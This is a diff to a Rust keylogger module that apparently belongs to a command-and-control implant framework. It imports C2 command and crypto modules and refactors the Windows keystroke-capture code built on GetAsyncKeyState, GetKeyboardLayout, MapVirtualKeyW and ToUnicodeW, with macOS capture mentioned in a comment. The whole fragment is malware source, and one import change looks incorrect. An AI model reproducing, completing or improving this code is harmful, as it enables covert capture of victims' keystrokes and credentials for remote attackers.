@@ -6,12 +6,11 @@
 //! - macOS: CGEventTap (requires accessibility permission)
 
 use anyhow::Result;
-use tracing::{debug, info, warn};
+use tracing::{debug, info};
 
 use crate::c2::Command;
 use crate::crypto;
 use crate::modules::ModuleError;
-use crate::utils;
 
 /// Keylogger module
 pub struct KeyloggerModule {
@@ -30,8 +29,10 @@ impl KeyloggerModule {
     /// Capture a single key press (platform-specific)
     #[cfg(windows)]
     fn capture_key(&self, key_code: u32) -> Result<Vec<u8>, ModuleError> {
-        use windows::Win32::UI::WindowsAndMessaging::{GetAsyncKeyState, GetKeyState, GetKeyboardLayout, ToUnicodeW, MapVirtualKeyW, MAPVK_VK_TO_VSC};
-        use windows::Win32::Foundation::HKL;
+        use windows::Win32::UI::WindowsAndMessaging::{
+            GetAsyncKeyState, GetKeyState, GetKeyboardLayout, ToUnicodeW, MAPVK_VK_TO_VSC,
+        };
+        use windows::Win32::Foundation::{MapVirtualKeyW, HKL};
 
         let mut state = [0u8; 256];
         unsafe {
@@ -45,7 +46,7 @@ impl KeyloggerModule {
                 // Map virtual key to character
                 let mut lpstr = [0u16; 16];
                 let keyboard_layout: HKL = GetKeyboardLayout(0);
-                let scan_code = MapVirtualKeyW(key_code as u32, MAPVK_VK_TO_VSC.0 as u32);
+                let scan_code = MapVirtualKeyW(key_code as u32, MAPVK_VK_TO_VSC);
                 let chars = ToUnicodeW(
                     key_code as u32,
                     scan_code,
